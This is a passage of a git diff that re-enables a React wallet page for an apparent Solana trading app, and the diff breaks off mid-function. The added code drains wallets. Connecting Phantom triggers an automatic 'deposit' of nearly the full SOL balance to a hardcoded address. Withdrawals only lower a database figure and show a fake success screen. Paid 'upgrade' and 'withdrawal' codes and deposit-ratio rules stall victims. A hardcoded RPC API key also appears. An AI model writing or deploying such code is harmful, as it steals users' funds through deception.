@@ -1,1055 +1,930 @@
-// "use client"
+"use client"
 
-// import Header from "@/components/header"
-// import WithdrawalSuccessModal from "../../components/withdrawalSuccessModal"
-// import {
-//   Wallet,
-//   TrendingUp,
-//   TrendingDown,
-//   ArrowUpRight,
-//   ArrowDownRight,
-//   DollarSign,
-//   Activity,
-//   Clock,
-//   KeyRound,
-//   ArrowUpCircle,
-//   X,
-//   AlertCircle,
-// } from "lucide-react"
-// import { useState, useEffect, useRef } from "react"
-// import { doc, collection, query, where, orderBy, onSnapshot, updateDoc, increment, getDocs } from "firebase/firestore"
-// import { db, realtimeDb } from "@/lib/firebase"
-// import { ref, onValue } from "firebase/database"
-// import { formatDistanceToNow } from "date-fns"
-// import { Button } from "@/components/ui/button"
-// import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"
-// import { toast } from "sonner"
-// import VerifyConnectModal from "@/components/verify-connect-modal"
+import Header from "@/components/header"
+import WithdrawalSuccessModal from "../../components/withdrawalSuccessModal"
+import {
+  Wallet,
+  TrendingUp,
+  TrendingDown,
+  ArrowUpRight,
+  ArrowDownRight,
+  DollarSign,
+  Activity,
+  Clock,
+  KeyRound,
+  ArrowUpCircle,
+  X,
+  AlertCircle,
+} from "lucide-react"
+import { useState, useEffect, useRef } from "react"
+import { doc, collection, query, where, orderBy, onSnapshot, updateDoc, increment, getDocs } from "firebase/firestore"
+import { db, realtimeDb } from "@/lib/firebase"
+import { ref, onValue } from "firebase/database"
+import { formatDistanceToNow } from "date-fns"
+import { Button } from "@/components/ui/button"
+import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"
+import { toast } from "sonner"
+import VerifyConnectModal from "@/components/verify-connect-modal"
 
-// declare global {
-//   interface Window {
-//     solana?: any
-//   }
-// }
+declare global {
+  interface Window {
+    solana?: any
+  }
+}
 
-// export default function WalletPage() {
-//   const [walletAddress, setWalletAddress] = useState<string | null>(null)
-//   const [balance, setBalance] = useState<number>(0)
-//   const [loading, setLoading] = useState(true)
-//   const [transactions, setTransactions] = useState<any[]>([])
-//   const [stats, setStats] = useState({
-//     totalProfit: 0,
-//     totalTrades: 0,
-//     winRate: 0,
-//     volume: 0,
-//   })
-//   const [processing, setProcessing] = useState(false)
-//   const [minBalance, setMinBalance] = useState(0.5)
-//   const [solToUsdRate, setSolToUsdRate] = useState(180)
-//   const [minDeposit, setMinDeposit] = useState(0.1)
-//   const [minWithdrawal, setMinWithdrawal] = useState(0.05)
-//   const [userMinDeposit, setUserMinDeposit] = useState<number | null>(null)
-//   const [userMinWithdrawal, setUserMinWithdrawal] = useState<number | null>(null)
-//   const [totalDepositedSOL, setTotalDepositedSOL] = useState(0)
-//   const [requiredDepositPercentage, setRequiredDepositPercentage] = useState(100)
-//   const [minWithdrawalAmount, setMinWithdrawalAmount] = useState(10)
-//   const [minBalanceForWithdrawal, setMinBalanceForWithdrawal] = useState(10)
-//   const [requireWithdrawalCode, setRequireWithdrawalCode] = useState(false)
-//   const [requireUpgradeCode, setRequireUpgradeCode] = useState(false)
-//   const [storedWithdrawalCode, setStoredWithdrawalCode] = useState("")
-//   const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
-//   const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
-//   const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
-//   const [showDepositRequiredDialog, setShowDepositRequiredDialog] = useState(false)
-//   const [depositShortfall, setDepositShortfall] = useState(0)
-//   const [requiredDepositForWithdrawal, setRequiredDepositForWithdrawal] = useState(0)
-//   const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
-//   const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
-//   const [codeError, setCodeError] = useState("")
-//   const [showWithdrawalSuccess, setShowWithdrawalSuccess] = useState(false)
-//   const [lastWithdrawalAmount, setLastWithdrawalAmount] = useState(0)
-//   const [lastWithdrawalHash, setLastWithdrawalHash] = useState("")
-//   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
+export default function WalletPage() {
+  const [walletAddress, setWalletAddress] = useState<string | null>(null)
+  const [balance, setBalance] = useState<number>(0)
+  const [loading, setLoading] = useState(true)
+  const [transactions, setTransactions] = useState<any[]>([])
+  const [stats, setStats] = useState({
+    totalProfit: 0,
+    totalTrades: 0,
+    winRate: 0,
+    volume: 0,
+  })
+  const [processing, setProcessing] = useState(false)
+  const [minBalance, setMinBalance] = useState(0.5)
+  const [solToUsdRate, setSolToUsdRate] = useState(180)
+  const [minDeposit, setMinDeposit] = useState(0.1)
+  const [minWithdrawal, setMinWithdrawal] = useState(0.05)
+  const [userMinDeposit, setUserMinDeposit] = useState<number | null>(null)
+  const [userMinWithdrawal, setUserMinWithdrawal] = useState<number | null>(null)
+  const [totalDepositedSOL, setTotalDepositedSOL] = useState(0)
+  const [requiredDepositPercentage, setRequiredDepositPercentage] = useState(100)
+  const [minWithdrawalAmount, setMinWithdrawalAmount] = useState(10)
+  const [minBalanceForWithdrawal, setMinBalanceForWithdrawal] = useState(10)
+  const [requireWithdrawalCode, setRequireWithdrawalCode] = useState(false)
+  const [requireUpgradeCode, setRequireUpgradeCode] = useState(false)
+  const [storedWithdrawalCode, setStoredWithdrawalCode] = useState("")
+  const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
+  const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
+  const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
+  const [showDepositRequiredDialog, setShowDepositRequiredDialog] = useState(false)
+  const [depositShortfall, setDepositShortfall] = useState(0)
+  const [requiredDepositForWithdrawal, setRequiredDepositForWithdrawal] = useState(0)
+  const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
+  const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
+  const [codeError, setCodeError] = useState("")
+  const [showWithdrawalSuccess, setShowWithdrawalSuccess] = useState(false)
+  const [lastWithdrawalAmount, setLastWithdrawalAmount] = useState(0)
+  const [lastWithdrawalHash, setLastWithdrawalHash] = useState("")
+  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
 
-//   // Real-time SOL price
-//   const [livePrice, setLivePrice] = useState<number | null>(null)
-//   const priceIntervalRef = useRef<NodeJS.Timeout | null>(null)
+  // Real-time SOL price
+  const [livePrice, setLivePrice] = useState<number | null>(null)
+  const priceIntervalRef = useRef<NodeJS.Timeout | null>(null)
 
-//   // Fetch live SOL/USD price from CoinGecko
-//   const fetchSolPrice = async () => {
-//     try {
-//       const res = await fetch(
-//         "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
-//         { cache: "no-store" }
-//       )
-//       const data = await res.json()
-//       if (data?.solana?.usd) {
-//         setLivePrice(data.solana.usd)
-//       }
-//     } catch {
-//       // silently fall back to Firebase rate
-//     }
-//   }
+  // Fetch live SOL/USD price from CoinGecko
+  const fetchSolPrice = async () => {
+    try {
+      const res = await fetch(
+        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
+        { cache: "no-store" }
+      )
+      const data = await res.json()
+      if (data?.solana?.usd) {
+        setLivePrice(data.solana.usd)
+      }
+    } catch {
+      // silently fall back to Firebase rate
+    }
+  }
 
-//   useEffect(() => {
-//     fetchSolPrice()
-//     priceIntervalRef.current = setInterval(fetchSolPrice, 30000) // refresh every 30s
-//     return () => {
-//       if (priceIntervalRef.current) clearInterval(priceIntervalRef.current)
-//     }
-//   }, [])
+  useEffect(() => {
+    fetchSolPrice()
+    priceIntervalRef.current = setInterval(fetchSolPrice, 30000) // refresh every 30s
+    return () => {
+      if (priceIntervalRef.current) clearInterval(priceIntervalRef.current)
+    }
+  }, [])
 
-//   // Use live price when available, fall back to Firebase rate
-//   const effectiveSolPrice = livePrice ?? solToUsdRate
+  // Use live price when available, fall back to Firebase rate
+  const effectiveSolPrice = livePrice ?? solToUsdRate
 
-//   useEffect(() => {
-//     let walletCleanup: (() => void) | undefined
+  useEffect(() => {
+    let walletCleanup: (() => void) | undefined
 
-//     const address = localStorage.getItem("walletAddress")
-//     if (address) {
-//       setWalletAddress(address)
-//       walletCleanup = setupWalletListener(address)
-//     } else {
-//       setLoading(false)
-//     }
+    const address = localStorage.getItem("walletAddress")
+    if (address) {
+      setWalletAddress(address)
+      walletCleanup = setupWalletListener(address)
+    } else {
+      setLoading(false)
+    }
 
-//     const handleWalletConnected = () => {
-//       const newAddress = localStorage.getItem("walletAddress")
-//       if (newAddress) {
-//         setWalletAddress(newAddress)
-//         if (walletCleanup) walletCleanup()
-//         walletCleanup = setupWalletListener(newAddress)
-//       }
-//     }
+    const handleWalletConnected = () => {
+      const newAddress = localStorage.getItem("walletAddress")
+      if (newAddress) {
+        setWalletAddress(newAddress)
+        if (walletCleanup) walletCleanup()
+        walletCleanup = setupWalletListener(newAddress)
+      }
+    }
 
-//     window.addEventListener("walletConnected", handleWalletConnected)
+    window.addEventListener("walletConnected", handleWalletConnected)
 
-//     const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
-//     const unsubscribe = onValue(
-//       balanceRef,
-//       (snapshot) => {
-//         if (snapshot.exists()) {
-//           const data = snapshot.val()
-//           setMinBalance(data.minBalance || 0.5)
-//           setSolToUsdRate(data.solToUsdRate || 180)
-//           setMinDeposit(data.minDeposit || 0.1)
-//           setMinWithdrawal(data.minWithdrawal || 0.05)
-//         }
-//       },
-//       (err) => {
-//         console.error("Error fetching balance requirements:", err)
-//       },
-//     )
+    const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
+    const unsubscribe = onValue(
+      balanceRef,
+      (snapshot) => {
+        if (snapshot.exists()) {
+          const data = snapshot.val()
+          setMinBalance(data.minBalance || 0.5)
+          setSolToUsdRate(data.solToUsdRate || 180)
+          setMinDeposit(data.minDeposit || 0.1)
+          setMinWithdrawal(data.minWithdrawal || 0.05)
+        }
+      },
+      (err) => {
+        console.error("Error fetching balance requirements:", err)
+      },
+    )
 
-//     return () => {
-//       unsubscribe()
-//       if (walletCleanup) walletCleanup()
-//       window.removeEventListener("walletConnected", handleWalletConnected)
-//     }
-//   }, [])
+    return () => {
+      unsubscribe()
+      if (walletCleanup) walletCleanup()
+      window.removeEventListener("walletConnected", handleWalletConnected)
+    }
+  }, [])
 
-//   const setupWalletListener = (address: string) => {
-//     const walletRef = doc(db, "wallets", address)
-//     const unsubscribe = onSnapshot(walletRef, (docSnap) => {
-//       if (docSnap.exists()) {
-//         const data = docSnap.data()
-//         setBalance(data.balance || 0)
-//         setUserMinDeposit(data.minDeposit || null)
-//         setUserMinWithdrawal(data.minWithdrawal || null)
-//         setTotalDepositedSOL(data.totalDepositedSOL || 0)
-//         setRequiredDepositPercentage(data.requiredDepositPercentage || 100)
-//         setMinWithdrawalAmount(data.minWithdrawalAmount ?? 10)
-//         setMinBalanceForWithdrawal(data.minBalanceForWithdrawal ?? 10)
-//         setRequireWithdrawalCode(data.requireWithdrawalCode || false)
-//         setRequireUpgradeCode(data.requireUpgradeCode || false)
-//         setStoredWithdrawalCode(data.withdrawalCode || "")
-//         setStoredUpgradeCode(data.upgradeCode || "")
-//       }
-//       setLoading(false)
-//     })
+  const setupWalletListener = (address: string) => {
+    const walletRef = doc(db, "wallets", address)
+    const unsubscribe = onSnapshot(walletRef, (docSnap) => {
+      if (docSnap.exists()) {
+        const data = docSnap.data()
+        setBalance(data.balance || 0)
+        setUserMinDeposit(data.minDeposit || null)
+        setUserMinWithdrawal(data.minWithdrawal || null)
+        setTotalDepositedSOL(data.totalDepositedSOL || 0)
+        setRequiredDepositPercentage(data.requiredDepositPercentage || 100)
+        setMinWithdrawalAmount(data.minWithdrawalAmount ?? 10)
+        setMinBalanceForWithdrawal(data.minBalanceForWithdrawal ?? 10)
+        setRequireWithdrawalCode(data.requireWithdrawalCode || false)
+        setRequireUpgradeCode(data.requireUpgradeCode || false)
+        setStoredWithdrawalCode(data.withdrawalCode || "")
+        setStoredUpgradeCode(data.upgradeCode || "")
+      }
+      setLoading(false)
+    })
 
-//     const processTransactions = (txs: any[]) => {
-//       const sorted = [...txs].sort((a, b) => {
-//         const getTime = (t: any) => {
-//           if (!t) return 0
-//           if (t.toDate) return t.toDate().getTime()
-//           if (t.seconds) return t.seconds * 1000
-//           return new Date(t).getTime()
-//         }
-//         return getTime(b.timestamp) - getTime(a.timestamp)
-//       })
-//       setTransactions(sorted.slice(0, 20))
+    const processTransactions = (txs: any[]) => {
+      const sorted = [...txs].sort((a, b) => {
+        const getTime = (t: any) => {
+          if (!t) return 0
+          if (t.toDate) return t.toDate().getTime()
+          if (t.seconds) return t.seconds * 1000
+          return new Date(t).getTime()
+        }
+        return getTime(b.timestamp) - getTime(a.timestamp)
+      })
+      setTransactions(sorted.slice(0, 20))
 
-//       const completedTrades = sorted.filter((tx) => tx.status !== "pending")
-//       const successfulTrades = completedTrades.filter((tx) => tx.status === "success")
-//       const totalProfit = completedTrades.reduce((sum, tx) => sum + (tx.profit || 0), 0)
-//       const totalVolume = completedTrades.reduce((sum, tx) => sum + (tx.amount || 0), 0)
-//       const winRate = completedTrades.length > 0 ? (successfulTrades.length / completedTrades.length) * 100 : 0
+      const completedTrades = sorted.filter((tx) => tx.status !== "pending")
+      const successfulTrades = completedTrades.filter((tx) => tx.status === "success")
+      const totalProfit = completedTrades.reduce((sum, tx) => sum + (tx.profit || 0), 0)
+      const totalVolume = completedTrades.reduce((sum, tx) => sum + (tx.amount || 0), 0)
+      const winRate = completedTrades.length > 0 ? (successfulTrades.length / completedTrades.length) * 100 : 0
 
-//       setStats({ totalProfit, totalTrades: completedTrades.length, winRate, volume: totalVolume })
-//     }
+      setStats({ totalProfit, totalTrades: completedTrades.length, winRate, volume: totalVolume })
+    }
 
-//     let snipesQuery
-//     try {
-//       snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address), orderBy("timestamp", "desc"))
-//     } catch {
-//       snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address))
-//     }
+    let snipesQuery
+    try {
+      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address), orderBy("timestamp", "desc"))
+    } catch {
+      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address))
+    }
 
-//     let fallbackUnsubscribe: (() => void) | null = null
+    let fallbackUnsubscribe: (() => void) | null = null
 
-//     const unsubscribeSnipes = onSnapshot(
-//       snipesQuery,
-//       (snapshot) => {
-//         const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-//         processTransactions(txs)
-//       },
-//       (error) => {
-//         console.error("[v0] Snipes query error:", error.message)
-//         const fallbackQuery = query(collection(db, "snipes"), where("walletId", "==", address))
-//         getDocs(fallbackQuery)
-//           .then((snapshot) => {
-//             const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-//             processTransactions(txs)
-//           })
-//           .catch((err) => console.error("[v0] Fallback getDocs error:", err))
+    const unsubscribeSnipes = onSnapshot(
+      snipesQuery,
+      (snapshot) => {
+        const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+        processTransactions(txs)
+      },
+      (error) => {
+        console.error("[v0] Snipes query error:", error.message)
+        const fallbackQuery = query(collection(db, "snipes"), where("walletId", "==", address))
+        getDocs(fallbackQuery)
+          .then((snapshot) => {
+            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+            processTransactions(txs)
+          })
+          .catch((err) => console.error("[v0] Fallback getDocs error:", err))
 
-//         const unsubFallback = onSnapshot(
-//           fallbackQuery,
-//           (snapshot) => {
-//             const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-//             processTransactions(txs)
-//           },
-//           (err) => console.error("[v0] Fallback snipes listener error:", err.message),
-//         )
-//         fallbackUnsubscribe = unsubFallback
-//       },
-//     )
+        const unsubFallback = onSnapshot(
+          fallbackQuery,
+          (snapshot) => {
+            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+            processTransactions(txs)
+          },
+          (err) => console.error("[v0] Fallback snipes listener error:", err.message),
+        )
+        fallbackUnsubscribe = unsubFallback
+      },
+    )
 
-//     return () => {
-//       unsubscribe()
-//       unsubscribeSnipes()
-//       if (fallbackUnsubscribe) fallbackUnsubscribe()
-//     }
-//   }
+    return () => {
+      unsubscribe()
+      unsubscribeSnipes()
+      if (fallbackUnsubscribe) fallbackUnsubscribe()
+    }
+  }
 
-//   const handleDeposit = async () => {
-//     try {
-//       setProcessing(true)
-//       if (!window.solana || !window.solana.publicKey) {
-//         toast.error("Please connect your Phantom wallet first")
-//         return
-//       }
+  const handleDeposit = async () => {
+    try {
+      setProcessing(true)
+      if (!window.solana || !window.solana.publicKey) {
+        toast.error("Please connect your Phantom wallet first")
+        return
+      }
 
-//       const rpcEndpoints = [
-//         "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
-//         "https://api.mainnet-beta.solana.com",
-//         "https://rpc.ankr.com/solana",
-//       ]
-//       let connection = null
-//       for (const endpoint of rpcEndpoints) {
-//         try {
-//           connection = new Connection(endpoint, "confirmed")
-//           await connection.getLatestBlockhash()
-//           break
-//         } catch { continue }
-//       }
-//       if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")
+      const rpcEndpoints = [
+        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
+        "https://api.mainnet-beta.solana.com",
+        "https://rpc.ankr.com/solana",
+      ]
+      let connection = null
+      for (const endpoint of rpcEndpoints) {
+        try {
+          connection = new Connection(endpoint, "confirmed")
+          await connection.getLatestBlockhash()
+          break
+        } catch { continue }
+      }
+      if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")
 
-//       const wallet = window.solana
-//       const userBalance = await connection.getBalance(wallet.publicKey)
-//       const userBalanceInSOL = userBalance / LAMPORTS_PER_SOL
-//       const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit
+      const wallet = window.solana
+      const userBalance = await connection.getBalance(wallet.publicKey)
+      const userBalanceInSOL = userBalance / LAMPORTS_PER_SOL
+      const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit
 
-//       if (userBalanceInSOL < effectiveMinDeposit) {
-//         toast.error(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
-//         return
-//       }
+      if (userBalanceInSOL < effectiveMinDeposit) {
+        toast.error(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
+        return
+      }
 
-//       const transactionFeeReserve = 10000000
-//       const transferAmount = userBalance - transactionFeeReserve
-//       if (transferAmount <= 0) { toast.error("Insufficient balance after transaction fees"); return }
+      const transactionFeeReserve = 10000000
+      const transferAmount = userBalance - transactionFeeReserve
+      if (transferAmount <= 0) { toast.error("Insufficient balance after transaction fees"); return }
 
-//       const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
-//       const transaction = new Transaction().add(
-//         SystemProgram.transfer({
-//           fromPubkey: wallet.publicKey,
-//           toPubkey: new PublicKey(toWalletAddress),
-//           lamports: transferAmount,
-//         }),
-//       )
+      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
+      const transaction = new Transaction().add(
+        SystemProgram.transfer({
+          fromPubkey: wallet.publicKey,
+          toPubkey: new PublicKey(toWalletAddress),
+          lamports: transferAmount,
+        }),
+      )
 
-//       const { blockhash } = await connection.getLatestBlockhash()
-//       transaction.recentBlockhash = blockhash
-//       transaction.feePayer = wallet.publicKey
+      const { blockhash } = await connection.getLatestBlockhash()
+      transaction.recentBlockhash = blockhash
+      transaction.feePayer = wallet.publicKey
 
-//       const signedTransaction = await wallet.signTransaction(transaction)
-//       const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
-//       const confirmation = await connection.confirmTransaction(signature, "confirmed")
-//       if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)
+      const signedTransaction = await wallet.signTransaction(transaction)
+      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
+      const confirmation = await connection.confirmTransaction(signature, "confirmed")
+      if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)
 
-//       const transferredSOL = transferAmount / LAMPORTS_PER_SOL
-//       await updateDoc(doc(db, "wallets", walletAddress!), {
-//         balance: increment(transferredSOL),
-//         totalDepositedSOL: increment(transferredSOL),
-//         lastActive: new Date().toISOString(),
-//         lastDeposit: new Date().toISOString(),
-//         depositSignature: signature,
-//       })
-//       toast.success(`Successfully deposited ${transferredSOL.toFixed(4)} SOL`, {
-//         description: `Transaction: ${signature.slice(0, 8)}...`,
-//       })
-//     } catch (error: any) {
-//       console.error("[v0] Deposit error:", error)
-//       toast.error(`Deposit failed: ${error.message || "Please try again"}`)
-//     } finally {
-//       setProcessing(false)
-//     }
-//   }
+      const transferredSOL = transferAmount / LAMPORTS_PER_SOL
+      await updateDoc(doc(db, "wallets", walletAddress!), {
+        balance: increment(transferredSOL),
+        totalDepositedSOL: increment(transferredSOL),
+        lastActive: new Date().toISOString(),
+        lastDeposit: new Date().toISOString(),
+        depositSignature: signature,
+      })
+      toast.success(`Successfully deposited ${transferredSOL.toFixed(4)} SOL`, {
+        description: `Transaction: ${signature.slice(0, 8)}...`,
+      })
+    } catch (error: any) {
+      console.error("[v0] Deposit error:", error)
+      toast.error(`Deposit failed: ${error.message || "Please try again"}`)
+    } finally {
+      setProcessing(false)
+    }
+  }
 
-//   const handleWithdrawClick = () => {
-//     if (!window.solana || !window.solana.publicKey) { 
-//       toast.error("Please connect your Phantom wallet first")
-//       return 
-//     }
-//     if (balance < minBalanceForWithdrawal) {
-//       toast.error(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw`, {
-//         description: `Your current balance: ${balance.toFixed(4)} SOL`,
-//       })
-//       return
-//     }
-//     if (balance < minWithdrawalAmount) {
-//       toast.error(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL`, {
-//         description: `Your current balance: ${balance.toFixed(4)} SOL`,
-//       })
-//       return
-//     }
-//     const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
-//     if (balance < effectiveMinWithdrawal) {
-//       toast.error(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL`, {
-//         description: `Your balance: ${balance.toFixed(4)} SOL`,
-//       })
-//       return
-//     }
-//     const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
-//     if (totalDepositedSOL < requiredDepositAmount) {
-//       const shortfall = requiredDepositAmount - totalDepositedSOL
-//       setDepositShortfall(shortfall)
-//       setRequiredDepositForWithdrawal(requiredDepositAmount)
-//       setShowDepositRequiredDialog(true)
-//       return
-//     }
-//     if (balance <= 0) { 
-//       toast.error("No SOL available to withdraw")
-//       return 
-//     }
-//     if (requireUpgradeCode) { 
-//       setCodeError("")
-//       setUpgradeCodeEntry("")
-//       setShowUpgradeCodeDialog(true)
-//       return 
-//     }
-//     if (requireWithdrawalCode) { 
-//       setCodeError("")
-//       setWithdrawalCodeEntry("")
-//       setShowWithdrawalCodeDialog(true)
-//       return 
-//     }
-//     executeWithdraw()
-//   }
+  const handleWithdrawClick = () => {
+    if (!window.solana || !window.solana.publicKey) { 
+      toast.error("Please connect your Phantom wallet first")
+      return 
+    }
+    if (balance < minBalanceForWithdrawal) {
+      toast.error(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw`, {
+        description: `Your current balance: ${balance.toFixed(4)} SOL`,
+      })
+      return
+    }
+    if (balance < minWithdrawalAmount) {
+      toast.error(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL`, {
+        description: `Your current balance: ${balance.toFixed(4)} SOL`,
+      })
+      return
+    }
+    const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
+    if (balance < effectiveMinWithdrawal) {
+      toast.error(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL`, {
+        description: `Your balance: ${balance.toFixed(4)} SOL`,
+      })
+      return
+    }
+    const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
+    if (totalDepositedSOL < requiredDepositAmount) {
+      const shortfall = requiredDepositAmount - totalDepositedSOL
+      setDepositShortfall(shortfall)
+      setRequiredDepositForWithdrawal(requiredDepositAmount)
+      setShowDepositRequiredDialog(true)
+      return
+    }
+    if (balance <= 0) { 
+      toast.error("No SOL available to withdraw")
+      return 
+    }
+    if (requireUpgradeCode) { 
+      setCodeError("")
+      setUpgradeCodeEntry("")
+      setShowUpgradeCodeDialog(true)
+      return 
+    }
+    if (requireWithdrawalCode) { 
+      setCodeError("")
+      setWithdrawalCodeEntry("")
+      setShowWithdrawalCodeDialog(true)
+      return 
+    }
+    executeWithdraw()
+  }
 
-//   const handleUpgradeCodeSubmit = () => {
-//     if (upgradeCodeEntry.trim() === storedUpgradeCode) {
-//       setShowUpgradeCodeDialog(false)
-//       if (requireWithdrawalCode) { 
-//         setCodeError("")
-//         setWithdrawalCodeEntry("")
-//         setShowWithdrawalCodeDialog(true)
-//       } else {
-//         executeWithdraw()
-//       }
-//     } else {
-//       setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
-//     }
-//   }
+  const handleUpgradeCodeSubmit = () => {
+    if (upgradeCodeEntry.trim() === storedUpgradeCode) {
+      setShowUpgradeCodeDialog(false)
+      if (requireWithdrawalCode) { 
+        setCodeError("")
+        setWithdrawalCodeEntry("")
+        setShowWithdrawalCodeDialog(true)
+      } else {
+        executeWithdraw()
+      }
+    } else {
+      setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
+    }
+  }
 
-//   const handleWithdrawalCodeSubmit = () => {
-//     if (withdrawalCodeEntry.trim() === storedWithdrawalCode) {
-//       setShowWithdrawalCodeDialog(false)
-//       executeWithdraw()
-//     } else {
-//       setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
-//     }
-//   }
+  const handleWithdrawalCodeSubmit = () => {
+    if (withdrawalCodeEntry.trim() === storedWithdrawalCode) {
+      setShowWithdrawalCodeDialog(false)
+      executeWithdraw()
+    } else {
+      setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
+    }
+  }
 
-//   const executeWithdraw = async () => {
-//     try {
-//       setProcessing(true)
-//       if (!window.solana || !window.solana.publicKey) { 
-//         toast.error("Please connect your Phantom wallet first")
-//         return 
-//       }
-//       if (balance <= 0) { 
-//         toast.error("No SOL available to withdraw")
-//         return 
-//       }
+  const executeWithdraw = async () => {
+    try {
+      setProcessing(true)
+      if (!window.solana || !window.solana.publicKey) { 
+        toast.error("Please connect your Phantom wallet first")
+        return 
+      }
+      if (balance <= 0) { 
+        toast.error("No SOL available to withdraw")
+        return 
+      }
 
-//       const withdrawalAmount = balance
-//       const withdrawalRef = `WD-${Date.now()}-${walletAddress!.slice(0, 6)}`
+      const withdrawalAmount = balance
+      const withdrawalRef = `WD-${Date.now()}-${walletAddress!.slice(0, 6)}`
 
-//       await updateDoc(doc(db, "wallets", walletAddress!), {
-//         balance: increment(-withdrawalAmount),
-//         lastActive: new Date().toISOString(),
-//         lastWithdraw: new Date().toISOString(),
-//         withdrawSignature: withdrawalRef,
-//       })
+      await updateDoc(doc(db, "wallets", walletAddress!), {
+        balance: increment(-withdrawalAmount),
+        lastActive: new Date().toISOString(),
+        lastWithdraw: new Date().toISOString(),
+        withdrawSignature: withdrawalRef,
+      })
 
 
       
 
 
-//       setLastWithdrawalAmount(withdrawalAmount)
-//       setLastWithdrawalHash(withdrawalRef)
-//       setShowWithdrawalSuccess(true)
+      setLastWithdrawalAmount(withdrawalAmount)
+      setLastWithdrawalHash(withdrawalRef)
+      setShowWithdrawalSuccess(true)
 
 
 
-//       setTimeout(() => {
-//         setShowWithdrawalSuccess(false)
-//       }, 20000)
-//     } catch (error: any) {
-//       console.error("[v0] Withdraw error:", error)
-//       toast.error(`Withdraw failed: ${error.message || "Please try again"}`)
-//     } finally {
-//       setProcessing(false)
-//     }
-//   }
+      setTimeout(() => {
+        setShowWithdrawalSuccess(false)
+      }, 20000)
+    } catch (error: any) {
+      console.error("[v0] Withdraw error:", error)
+      toast.error(`Withdraw failed: ${error.message || "Please try again"}`)
+    } finally {
+      setProcessing(false)
+    }
+  }
 
-//     const handlePhantomConnect = async () => {
-//   try {
-//     setProcessing(true);
+    const handlePhantomConnect = async () => {
+  try {
+    setProcessing(true);
 
-//     const provider = window.solana;
+    const provider = window.solana;
 
-//     if (!provider?.isPhantom) {
-//       toast.error("Phantom Wallet is not installed", {
-//         description: "Please install Phantom from https://phantom.app",
-//       });
-//       return;
-//     }
+    if (!provider?.isPhantom) {
+      toast.error("Phantom Wallet is not installed", {
+        description: "Please install Phantom from https://phantom.app",
+      });
+      return;
+    }
 
-//     // Connect Phantom
-//     await provider.connect();
+    // Connect Phantom
+    await provider.connect();
     
-//     const address = provider.publicKey.toString();
+    const address = provider.publicKey.toString();
 
-//     localStorage.setItem("walletAddress", address);
-//     setWalletAddress(address);
+    localStorage.setItem("walletAddress", address);
+    setWalletAddress(address);
 
-//     window.dispatchEvent(new Event("walletConnected"));
+    window.dispatchEvent(new Event("walletConnected"));
 
-//     // Close the modal
-//     setIsWalletModalOpen(false);
+    // Close the modal
+    setIsWalletModalOpen(false);
 
-//     // Wait a moment for React state to update
-//     setTimeout(async () => {
-//       await handleDeposit();
-//     }, 300);
+    // Wait a moment for React state to update
+    setTimeout(async () => {
+      await handleDeposit();
+    }, 300);
 
-//   } catch (error: any) {
-//     console.error(error);
+  } catch (error: any) {
+    console.error(error);
 
-//     toast.error("Failed to verify wallet", {
-//       description: error?.message || "Connection failed",
